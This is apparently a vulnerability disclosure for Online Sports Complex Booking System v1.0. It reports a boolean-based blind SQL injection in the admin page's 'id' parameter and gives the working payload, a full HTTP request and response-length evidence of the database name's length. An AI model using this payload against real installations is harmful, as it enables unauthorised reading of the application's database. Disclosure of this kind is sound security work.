# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: /scbs/admin/?page=user/manage_user&id=

Vulnerability location: /scbs/admin/?page=user/manage_user&id=, id

Current database name: scbs_db,length is 7

[+] Payload: /scbs/admin/?page=user/manage_user&id=10%27%20and%20length(database())%20=7--+

```sql
GET /scbs/admin/?page=user/manage_user&id=10%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gp584rjk4ugbjakmto03cu7pco
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 22616
![image](https://user-images.githubusercontent.com/54017627/165214529-8203f1f4-b805-4dd1-968c-2af60e5c29b5.png)

![image](https://user-images.githubusercontent.com/54017627/165214442-6f48a3a1-8d4a-40a0-85d9-55d5b9bb4f0d.png)

When length (database ()) = 7, Content-Length: 22473
![image](https://user-images.githubusercontent.com/54017627/165214489-8a678bb7-a48b-4568-9943-b4adcec17775.png)

![image](https://user-images.githubusercontent.com/54017627/165214409-8966f3d8-72ff-4a2c-b32c-7cd5e5fc4d1c.png)
